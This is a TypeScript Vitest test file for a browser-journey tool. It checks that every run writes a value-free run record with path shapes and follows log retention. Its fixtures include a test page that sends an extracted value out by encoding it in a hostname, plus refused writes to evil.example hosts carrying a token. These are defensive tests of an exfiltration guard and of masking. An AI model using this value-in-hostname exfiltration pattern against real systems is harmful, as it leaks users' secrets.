import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

// A real browser: the default new PlaywrightBrowserPort() behind run_journey (test/browser-suites.ts reads this).
import { createServer, type Server } from "node:http";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { ProfileManager } from "@jevitate/daemon";
import type { Journey } from "@jevitate/journey";
import { buildMcpTools } from "./mcp-api.js";
import { buildProgram } from "./program.js";
import { journeyReviewHash } from "./journey-review.js";
import { journeyRouteLiterals, JourneyRunRecorder, withJourneyRunRecord, writePathShape, type JourneyRunRecord } from "./journey-run-record.js";
import { pruneLogs } from "./logs-retention.js";

// #787: which receipt a live verifier still holds (a real one needs a running proof and its signing key).
vi.mock("./journey-verify-checkpoint.js", async (original) => ({
  ...(await original<typeof import("./journey-verify-checkpoint.js")>()),
  isLiveVerifyReceipt: (path: string) => path.endsWith("live.abc.json"),
}));

/** #790: every run_journey / journey run leaves one value-free record in the logs area, following retention. */

const SECRET = "tok_s3cret-VALUE-77";
const PLAIN = "plain-param-value";
const PAGE_TEXT = "PAGE-ONLY-TEXT-991";
const EXTRACTED = "xtr4ct3d";

let server: Server;
let origin: string;
let root: string;
let journeysDir: string;
let logs: string;

function journey(id: string, last: "ok" | "fails"): Journey {
  const j = {
    metadata: {
      id,
      name: id,
      promoted: true,
      params: [],
      parameters: [{ name: "apiKey", description: "a key", secret: true }, { name: "customer", description: "a customer" }],
      createdAtIso: "2026-11-05T00:00:00.000Z",
    },
    recording: {
      version: "1",
      site: origin,
      pages: [
        {
          url: "/",
          steps: [
            { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { testId: "note" } } } },
            { step: { kind: "fill", target: { testId: "note" }, value: { var: "apiKey" }, expect: { kind: "visible", target: { testId: "note" } } } },
            { step: { kind: "fill", target: { testId: "who" }, value: { var: "customer" }, expect: { kind: "visible", target: { testId: "who" } } } },
            { step: { kind: "click", target: { testId: "send" }, expect: { kind: "visible", target: { testId: last === "ok" ? "sent" : "never" } } }, delta: { verdict: "relevant-change", why: "s", changes: ["s"], requests: ["POST /api/v2/customers/${customer}/notes/${note} → 200"], overheadMs: 1 } },
          ],
        },
      ],
    },
  } as unknown as Journey;
  j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" };
  return j;
}

function records(): Array<{ path: string; text: string; record: JourneyRunRecord }> {
  if (!existsSync(logs)) return [];
  return readdirSync(logs).flatMap((date) =>
    readdirSync(join(logs, date))
      .filter((f) => f.startsWith("journey-run-"))
      .map((f) => {
        const path = join(logs, date, f);
        const text = readFileSync(path, "utf8");
        return { path, text, record: JSON.parse(text) as JourneyRunRecord };
      }),
  );
}

const mcpRun = async (id: string): Promise<{ text: string; body: Record<string, unknown> }> => {
  // The secret parameter comes from the operator's targets.json: an MCP request never carries one.
  vi.stubEnv("JEV_RECORD_API_KEY", SECRET);
  writeFileSync(join(root, "environments.json"), JSON.stringify({ local: { baseUrl: origin } }));
  writeFileSync(join(root, "targets.json"), JSON.stringify({ [origin]: { secretFields: ["testId=note=env:JEV_RECORD_API_KEY"] } }));
  const tool = buildMcpTools({ journeysDir, pathRoots: [root], runRecordLogsRoot: logs, environmentsFile: join(root, "environments.json"), targetsConfigPath: join(root, "targets.json") }).find((t) => t.name === "run_journey")!;
  const text = (await tool.handler({ id, env: "local", params: { customer: PLAIN } })).content[0]!.text;
  return { text, body: JSON.parse(text) as Record<string, unknown> };
};

async function cliRun(id: string): Promise<{ out: string; err: string }> {
  let out = "";
  let err = "";
  const program = buildProgram({ profiles: new ProfileManager(join(root, "profiles")), dbPath: join(root, "site.sqlite"), journeysDir, logs: { logsRoot: logs } });
  program.exitOverride();
  program.configureOutput({ writeOut: (s) => void (out += s), writeErr: (s) => void (err += s) });
  for (const c of program.commands) for (const sub of c.commands) sub.configureOutput({ writeOut: (s) => void (out += s), writeErr: (s) => void (err += s) });
  const saved = process.exitCode;
  await program.parseAsync(["journey", "run", id, "--param", `apiKey=${SECRET}`, "--param", `customer=${PLAIN}`, "--json"], { from: "user" });
  process.exitCode = saved;
  return { out, err };
}

function expectValueFree(text: string): void {
  expect(text).not.toContain(SECRET);
  expect(text).not.toContain(PLAIN);
  expect(text).not.toContain(PAGE_TEXT);
  expect(text).not.toContain("q=1");
}

beforeAll(async () => {
  server = createServer((req, res) => {
    res.writeHead(200, { "content-type": "text/html" });
    if (req.method === "POST") {
      res.end(`<p data-testid=sent>${PAGE_TEXT}</p>`);
      return;
    }
    if (req.url === "/exfil") {
      res.end(`<p data-testid=code>Xtr4Ct3D</p><button data-testid=send onclick="fetch('http://Xtr4Ct3D.localhost:9/x',{method:'POST',mode:'no-cors'}).catch(()=>0)">Save</button>`);
      return;
    }
    res.end(`<p>${PAGE_TEXT}</p><form method=post action="/api/v2/customers/${PLAIN}/notes/12345?q=1"><input data-testid=note name=note><input data-testid=who name=who><button data-testid=send>Save</button></form>`);
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  root = mkdtempSync(join(tmpdir(), "jev-790-"));
  journeysDir = join(root, "journeys");
  mkdirSync(journeysDir, { recursive: true });
  logs = join(root, "logs");
  for (const j of [journey("good", "ok"), journey("bad", "fails")]) writeFileSync(join(journeysDir, `${j.metadata.id}.json`), JSON.stringify(j));
  writeFileSync(join(journeysDir, "draft.json"), JSON.stringify({ ...journey("draft", "ok"), metadata: { ...journey("draft", "ok").metadata, promoted: false, approval: undefined } }));
});

afterAll(() => {
  server.closeAllConnections();
  server.close();
  rmSync(root, { recursive: true, force: true });
});

beforeEach(() => {
  vi.stubEnv("JEVITATE_RUN_RECORD", "");
  rmSync(logs, { recursive: true, force: true });
});

afterEach(() => {
  vi.unstubAllEnvs();
  try {
    chmodSync(logs, 0o755);
  } catch {
    // Not every test made it read-only.
  }
});

describe("#790 the record over MCP", () => {
  it("a successful run: id, hash, origin, outcome, steps, writes with method and path shape, timestamps, channel; no value", async () => {
    const r = await mcpRun("good");
    expect(r.body.outcome, r.text).toBe("ok");
    const [one, ...rest] = records();
    expect(rest).toEqual([]);
    expect(one!.record).toMatchObject({ kind: "journey-run", channel: "mcp", journey: { id: "good", hash: journeyReviewHash(journey("good", "ok")) }, origin, outcome: "ok", stepCount: 4 });
    expect(one!.record.writes).toEqual({ count: 1, refused: 0, shapes: [{ method: "POST", path: "/api/v2/customers/:param/notes/:id", count: 1 }] });
    expect(Date.parse(one!.record.endedAt)).toBeGreaterThanOrEqual(Date.parse(one!.record.startedAt));
    expectValueFree(one!.text);
  }, 60_000);

  it("a failing run records its outcome and step, no reason text", async () => {
    await mcpRun("bad");
    const [one] = records();
    expect(one!.record).toMatchObject({ outcome: "quarantined", stoppedAtStep: 4 });
    expect(one!.record.writes.count).toBe(1);
    expectValueFree(one!.text);
  }, 60_000);

  it("a refused run is recorded too, with its code", async () => {
    await mcpRun("draft");
    const [one] = records();
    expect(one!.record).toMatchObject({ outcome: "refused", code: "E_JOURNEY_NOT_PROMOTED", writes: { count: 0 } });
    expectValueFree(one!.text);
  }, 60_000);

  it("a record that cannot be written never changes the outcome: reported as runRecordError", async () => {
    writeFileSync(logs, "a file where the logs directory should be");
    const r = await mcpRun("good");
    expect(r.body.outcome).toBe("ok");
    expect(String(r.body.runRecordError)).toContain("could not be written");
    expectValueFree(r.text.replace(/"output":\{[^}]*\}/, ""));
    rmSync(logs);
    const refused = await (async () => {
      writeFileSync(logs, "again");
      return mcpRun("draft");
    })();
    expect(refused.body).toMatchObject({ code: "E_JOURNEY_NOT_PROMOTED" });
    expect(String(refused.body.runRecordError)).toContain("could not be written");
    rmSync(logs);
  }, 60_000);
});

describe("#790 the record on the CLI", () => {
  it("success and failure, channel cli; the secret absent", async () => {
    await cliRun("good");
    await cliRun("bad");
    const all = records().map((r) => r.record.outcome).sort();
    expect(all).toEqual(["ok", "quarantined"]);
    for (const r of records()) {
      expect(r.record.channel).toBe("cli");
      expectValueFree(r.text);
    }
  }, 60_000);

  it("a record that cannot be written keeps the run's result and warns", async () => {
    writeFileSync(logs, "not a directory");
    const r = await cliRun("good");
    expect(r.out).toContain('"outcome":"ok"');
    expect(r.out).toContain("runRecordError");
    expect(r.err).toContain("warning: the run record could not be written");
    rmSync(logs);
  }, 60_000);
});

describe("#790 an extracted value, on a run the guard ends", () => {
  it("is in neither the record nor the refusal", async () => {
    const j = {
      metadata: { id: "exfil", name: "exfil", promoted: true, params: [], createdAtIso: "2026-11-05T00:00:00.000Z" },
      recording: {
        version: "1",
        site: origin,
        pages: [{
          url: "/exfil",
          steps: [
            { step: { kind: "navigate", url: "/exfil", expect: { kind: "visible", target: { testId: "code" } } } },
            { step: { kind: "extract", target: { testId: "code" }, as: "code", expect: { kind: "visible", target: { testId: "code" } } } },
            { step: { kind: "click", target: { testId: "send" }, expect: { kind: "visible", target: { testId: "code" } } } },
          ],
        }],
      },
    } as unknown as Journey;
    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z" };
    writeFileSync(join(journeysDir, "exfil.json"), JSON.stringify(j));
    const tool = buildMcpTools({ journeysDir, pathRoots: [root], runRecordLogsRoot: logs }).find((t) => t.name === "run_journey")!;
    const text = (await tool.handler({ id: "exfil", params: {} })).content[0]!.text;
    expect((JSON.parse(text) as { code?: string }).code, text).toBe("E_RUN_REFUSED_OFF_ALLOWLIST_WRITE");
    expect(text.toLowerCase()).not.toContain(EXTRACTED);
    const [one] = records();
    expect(one!.record.writes.shapes.map((s) => s.origin)).toEqual([expect.stringContaining("[param]")]);
    expect(one!.text.toLowerCase()).not.toContain(EXTRACTED);
  }, 60_000);
});

describe("#790 shapes and retention", () => {
  it("writePathShape keeps what the Journey recorded as literal, and nothing by its look", () => {
    const literal = new Set(["api", "users", "reset-password", "a", "b", "u", "edit"]);
    expect(writePathShape("/api/v2/users/42/reset-password", [], literal)).toBe("/api/v2/users/:id/reset-password");
    expect(writePathShape("/a/my-long-article-slug/b", [], literal)).toBe("/a/:id/b");
    expect(writePathShape("/u/alice/edit", ["alice"], literal)).toBe("/u/:param/edit");
    expect(writePathShape("/u/Alice%20B/edit", ["alice b"], literal)).toBe("/u/:param/edit");
    expect(writePathShape("/AbC123DeF", [])).toBe("/:id");
  });

  it("a token that reads as a word stays out of a shape", () => {
    const literal = new Set(["invite", "reset"]);
    expect(writePathShape("/invite/brave-otter", [], literal)).toBe("/invite/:id");
    expect(writePathShape("/reset/abcdefghijklmnopqrst", [], literal)).toBe("/reset/:id");
    expect(writePathShape("/reset/hunter", [], literal)).toBe("/reset/:id");
    expect(writePathShape("/invite/brave-otter", [])).toBe("/:id/:id");
    // Recorded as literal, and a value on this run: the value wins.
    expect(writePathShape("/invite/brave-otter", ["BRAVE-OTTER"], new Set(["invite", "brave-otter"]))).toBe("/invite/:param");
  });

  it("the literals are the Journey's own route text: no template, glob or query", () => {
    const j = {
      metadata: {},
      recording: {
        site: "https://x.test",
        pages: [{
          url: "https://x.test/start/here?token=abc",
          steps: [
            { step: { kind: "navigate", url: "/invite/${code}/open", expect: { kind: "count", target: { css: "a" }, min: 0 } } },
            { step: { kind: "click", target: { css: "a" }, expect: { kind: "count", target: { css: "a" }, min: 0 } }, delta: { verdict: "relevant-change", why: "s", changes: ["s"], requests: ["POST /api/comments?draft=1 → 201"], overheadMs: 1 } , expectRequests: [{ kind: "requestMade", method: "POST", pathGlob: "/api/*/publish" }] },
          ],
        }],
      },
    } as unknown as Journey;
    expect([...journeyRouteLiterals(j)].sort()).toEqual(["api", "comments", "here", "invite", "open", "publish", "start"]);
  });

  it("names a method only if it is a standard one", async () => {
    await withJourneyRunRecord({ channel: "mcp", id: "x", params: {}, logsRoot: logs }, async (rec) => {
      rec.noteRefusedWrite({ method: () => "TOKEN-a1b2c3", url: () => "https://evil.example/zz" } as never);
      rec.noteRefusedWrite({ method: () => "delete", url: () => "https://evil.example/zz" } as never);
      return { outcome: "ok" };
    });
    const [one] = records();
    expect(one!.text.toLowerCase()).not.toContain("a1b2c3");
    expect(one!.record.writes.shapes.map((s) => s.method)).toEqual(["OTHER", "DELETE"]);
  });

  it("masks a value from an off-origin host whatever its case, and an extracted one when the run throws", async () => {
    await withJourneyRunRecord({ channel: "mcp", id: "x", params: { token: "SeCrEtTok" }, logsRoot: logs }, async (rec) => {
      rec.noteValue("ExTrAcTeD");
      rec.noteRefusedWrite({ method: () => "POST", url: () => "https://SeCrEtTok.evil.example/zz" } as never);
      rec.noteRefusedWrite({ method: () => "POST", url: () => "https://extracted.evil.example/ExTrAcTeD" } as never);
      throw Object.assign(new Error("refused"), { code: "E_RUN_REFUSED_OFF_ALLOWLIST_WRITE", retryable: false });
    }).catch(() => undefined);
    const [one] = records();
    expect(one!.record.outcome).toBe("refused");
    expect(one!.text.toLowerCase()).not.toContain("secrettok");
    expect(one!.text.toLowerCase()).not.toContain("extracted");
    expect(one!.record.writes.shapes.map((s) => [s.origin, s.path])).toEqual([
      ["https://[param].evil.example", "/:id"],
      ["https://[param].evil.example", "/:param"],
    ]);
  });

  it("write is atomic: no temp file stays, even when the write fails midway", () => {
    const rec = new JourneyRunRecorder({ channel: "cli", id: "x", params: {}, logsRoot: logs });
    expect(rec.finish({ outcome: "ok" })).toBeUndefined();
    const [date] = readdirSync(logs);
    expect(readdirSync(join(logs, date!)).filter((f) => f.endsWith(".tmp"))).toEqual([]);
  });

  it("logs prune removes an old record and keeps the newest (as for any run)", () => {
    const rec = new JourneyRunRecorder({ channel: "cli", id: "x", params: {}, logsRoot: logs });
    rec.finish({ outcome: "ok" });
    const [one] = records();
    const old = new Date("2020-01-01T00:00:00Z");
    utimesSync(one!.path, old, old);
    expect(pruneLogs(logs, { ttlDays: 14, keepLatest: 1 }).removed).toEqual([]);
    expect(pruneLogs(logs, { ttlDays: 14, keepLatest: 0 }).removed).toHaveLength(1);
    expect(records()).toEqual([]);
  });

  it("logs prune covers verify-progress receipts: old ones go, each pool keeps its newest, a live verifier's stays", () => {
    const dir = join(logs, "verify-progress");
    mkdirSync(dir, { recursive: true });
    const old = new Date("2020-01-01T00:00:00Z");
    const receipt = (name: string, body: object): string => {
      const p = join(dir, name);
      writeFileSync(p, JSON.stringify(body));
      utimesSync(p, old, old);
      return p;
    };
    const done = receipt("done.abc.json", { not: "a checkpoint" });
    const live = receipt("live.abc.json", { not: "read: the seam above answers" });
    const report = pruneLogs(logs, { ttlDays: 14, keepLatest: 0 }, { dryRun: true });
    expect(report.removed).toEqual(["verify-progress/done.abc.json"]);
    expect(existsSync(done)).toBe(true);
    expect(pruneLogs(logs, { ttlDays: 14, keepLatest: 1 }).removed).toEqual([]);
    expect(pruneLogs(logs, { ttlDays: 14, keepLatest: 0 }).removed).toEqual(["verify-progress/done.abc.json"]);
    expect(existsSync(done)).toBe(false);
    expect(existsSync(live)).toBe(true);
  });
});
